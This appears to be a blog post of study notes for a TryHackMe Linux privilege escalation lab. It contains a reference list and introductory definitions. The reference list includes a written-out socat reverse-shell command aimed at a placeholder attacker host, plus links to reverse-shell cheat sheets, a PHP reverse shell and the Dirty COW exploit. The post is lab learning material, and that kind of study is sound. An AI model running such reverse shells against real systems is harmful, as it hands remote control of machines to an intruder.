---
title:  "THM: Linux Privilege Escalation"
date:   2024-03-03 15:00:00 +0000
categories: [Linux]
tags: [Linux]
---

![image](/assets/img/wts.png) 

---
Ref: 

- [THM: Linux Privilege Escalatio](https://tryhackme.com/r/room/linprivesc)

- [Named Pipe](https://www.linuxjournal.com/article/2156) 


- [For socat to work, needs to install socat to target using "Precompiled socat binary"](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)
```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
- [Dirty C0w](https://dirtycow.ninja/) 

- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

- [PentestMonkey PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

- [PentestMonkey Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

- [```SecLists repo```](https://github.com/danielmiessler/SecLists)

-  Kali Linux - webshells located at ```/usr/share/webshells```

- [Upload Vulnerabilities Room](https://tryhackme.com/room/uploadvulns) 

- [DisroWatch](https://distrowatch.com/dwres.php?resource=major "Link")

- [Link](https://www.youtube.com/watch?v=zc5Z6C2zmNA)


---

ask 1 Introduction
---
Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.

This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.

---

Task 2
---

What is Privilege Escalation?
What does "privilege escalation" mean?

At it's core, Privilege Escalation usually involves going ```from a lower permission account to a higher permission one```. More technically, it's the ```exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources``` that are usually restricted from the users.


#### Why is it important?

It's rare when performing a real-world penetration test to be able to ```gain a foothold (initial access)``` that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

- Resetting passwords
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistence
- Changing the privilege of existing (or new) users
- Execute any administrative command

---